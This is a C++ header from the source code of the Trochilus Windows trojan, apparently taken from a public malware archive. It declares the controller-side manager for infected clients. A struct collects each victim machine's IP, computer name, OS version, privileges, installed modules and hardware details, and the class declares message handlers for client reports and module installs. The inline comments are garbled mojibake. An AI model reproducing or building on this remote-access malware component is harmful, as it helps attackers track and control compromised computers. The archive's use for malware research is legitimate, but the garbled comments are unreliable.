/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include <map>
#include "ClientInfoCallbacks.h"
#include "thread/RepeatTask.h"


//�ͻ��˻�����Ϣ
typedef std::map<tstring, MSGSERIALID> MsgSerialIDMap;

typedef struct  
{
	BOOL			bValid;

	ULONG			connectIP;	//�ͷ�������ӵ�IP
	tstring			computerName;
	tstring			vercode;
	WIN_VER_DETAIL	windowsVersion;	//����ϵͳ
	BOOL			bX64;	//�Ƿ�x64ƽ̨
	__time64_t		installTime;	//�ͻ��˰�װʱ��
	TStringVector	localIPList;

	__time64_t		reportTime;	//�ϱ�ʱ��

	MSGSERIALID		requestSerialID;	//����ͻ��˱������ݵ����к�id
	__time64_t		requestTime;	//�����ϱ���ʱ��
	tstring			mods;	//�ͻ��˰�װ��ģ���б�
	tstring			groups; //������
	tstring			priv; //Ȩ��
	tstring			lang;
	COMM_NAME		commtype;
	int				cpunum;
	int				cpufrep;
	int				memsize;
	MsgSerialIDMap	installModMsgIDMap;	//����ģ�鰲װ����Ϣidӳ��
	BOOL bAdd;
} CLIENT_BASE_INFO;

typedef std::map<tstring, CLIENT_BASE_INFO> ClientBaseInfoMap;

class ClientInfoManager
{
	DECLARE_SINGLETON(ClientInfoManager);
public:
	BOOL StartWorking();
	BOOL GetClientBaseInfo(LPCTSTR clientid, CLIENT_BASE_INFO& baseInfo);
	void SetCallbacks(FnNotifyProc fnCallback, LPVOID lpParameter);
	void TransferInfo(LPCTSTR clientid, const CLIENT_BASE_INFO* pBaseInfo, CLIENT_INFO& info) const;

	void HandleInstalMsg(tstring clientid,CLIENT_BASE_INFO& info);

	static BOOL MsgHandler_OutputError( MSGID msgid, const CommData& commData, LPVOID lpParameter );
	static BOOL MsgHandler_ClientInfo( MSGID msgid, const CommData& commData, LPVOID lpParameter );

private:
	static DWORD WINAPI CheckInfoTask(LPVOID lpParameter);
	void CheckInfoProc();
	MSGSERIALID RequestReportInfo(LPCTSTR clientid) const;
	BOOL ParseData(const CommData& commData, CLIENT_BASE_INFO& baseInfo) const;

private:
	CriticalSection		m_infoMapSection;
	ClientBaseInfoMap	m_clientBaseInfoMap;
	RepeatTask			m_checkInfoTask;

	FnModuleNotifyProc m_fnModuleCallback;
	FnNotifyProc		m_fnCallback;
	LPVOID				m_lpParameter;
};
